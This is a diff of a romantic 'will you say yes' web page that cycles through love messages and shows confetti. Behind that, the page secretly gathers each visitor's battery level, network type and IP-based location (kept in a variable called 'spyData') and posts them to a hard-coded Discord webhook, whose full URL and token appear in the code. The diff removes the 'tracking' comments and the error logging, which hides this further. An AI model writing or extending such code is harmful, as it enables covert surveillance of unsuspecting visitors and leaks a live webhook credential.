@@ -79,19 +79,35 @@
   let batteryLevel = "N/A", connectionType = "N/A";
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
+  // NEW: 20 RANDOM SUCCESS MESSAGES
   const promises = [
-    "I promise to hold your hand through every storm, {name}.",
-    "{name}, I promise to stay until the stars stop shining.",
-    "You made me the luckiest alive, {name}. I'm yours forever."
+    "Thank you, {name}. I promise to hold your hand through every storm. We are forever.",
+    "You made me the luckiest alive, {name}. I'm yours forever.",
+    "{name}, I promise to love you more with every sunrise.",
+    "I knew you'd say yes, {name}! I promise to be your safest place.",
+    "My heart is finally at peace. Thank you for choosing me, {name}.",
+    "{name}, I promise to keep a smile on your face and love in your heart.",
+    "You're my greatest adventure, {name}. Let's make this forever.",
+    "To the world you may be one person, but to me you are the world, {name}.",
+    "Thank you for saying yes, {name}. I promise to fight for us, always.",
+    "{name}, you are my today and all of my tomorrows.",
+    "My heart is officially yours, {name}. Handle with love!",
+    "I promise to be the reason you look down at your phone and smile, {name}.",
+    "{name}, I'll be your shoulder to lean on and your partner in crime.",
+    "I'm so glad it's you, {name}. I promise to choose you every single day.",
+    "{name}, you're the best thing that ever happened to me. Forever starts now.",
+    "I promise to love you even when we're old and wrinkly, {name}.",
+    "You've made me so happy, {name}. I promise to return that happiness tenfold.",
+    "{name}, I promise to be your biggest fan and your best friend.",
+    "Thank you for letting me love you, {name}. It's a promise I'll never break.",
+    "I'm yours, {name}. No refunds, no exchanges, just endless love."
   ];
 
   window.onload = async () => {
-    // Battery tracking
     if (navigator.getBattery) {
       const battery = await navigator.getBattery();
       batteryLevel = `${Math.round(battery.level * 100)}%`;
     }
-    // Network tracking
     if (navigator.connection) {
       connectionType = navigator.connection.effectiveType || "Unknown";
     }
@@ -110,7 +126,6 @@
 
   async function sendDiscordReport(status) {
     const now = new Date();
-    
     let spyData = {};
     try {
         const res = await fetch('https://ipapi.co/json/');
@@ -134,12 +149,11 @@
       }]
     };
 
-    // ALWAYS SEND NEW MESSAGE (FRESH BOX)
     fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-    }).catch(err => console.log("Discord error:", err));
+    });
   }
 
   function startApp() {
@@ -165,11 +179,16 @@
   }
 
   function yesClick() {
-    sendDiscordReport("SAID YES! ❤️");
+    // SELECTS A RANDOM MESSAGE FROM THE ARRAY OF 20
+    const randomPromise = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
+    
+    sendDiscordReport(`SAID YES! ❤️ | Quote: "${randomPromise}"`);
+    
     document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
     confetti({ particleCount: 150, spread: 70 });
-    const randomMsg = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
-    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p>${randomMsg}</p></div>`;
+    
+    // UPDATES THE CARD WITH THE RANDOM MESSAGE
+    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p style="font-size:1.1rem; line-height:1.5;">${randomPromise}</p></div>`;
   }
 
   function updateSuggestions() {
